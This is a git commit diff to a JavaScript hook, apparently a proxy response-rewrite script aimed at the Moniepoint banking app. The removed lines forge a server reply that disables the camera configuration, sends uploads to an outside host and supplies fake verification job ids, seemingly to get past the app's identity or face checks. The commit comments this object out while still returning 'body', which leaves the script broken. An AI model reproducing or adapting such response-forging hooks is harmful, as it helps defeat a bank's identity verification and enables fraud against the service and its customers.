9546c24907676b640db9dd4594b89b16a62a9bd4
prince <62496012+Prince-cool@users.noreply.github.com>
2024-11-16 21:33:11 +0800

    Update hook.js

--- Moniepoint/Javascript/hook.js
+++ Moniepoint/Javascript/hook.js
@@ -1,11 +1,11 @@
-var obj = {
-    "code": "2202",
-    "camera_config": "null",
-    "upload_url": "https://www.argun.cc/",
-    "ref_id": "6506-0009487784-argun666niuniujun0fdcnchgqz7s6",
-    "smile_job_id": "6666666666"
-  },
-  body = JSON.stringify(obj);
+// var obj = {
+//     "code": "2202",
+//     "camera_config": "null",
+//     "upload_url": "https://www.argun.cc/",
+//     "ref_id": "6506-0009487784-argun666niuniujun0fdcnchgqz7s6",
+//     "smile_job_id": "6666666666"
+//   },
+//   body = JSON.stringify(obj);
 $done({
   "body": body,
   "status": 200
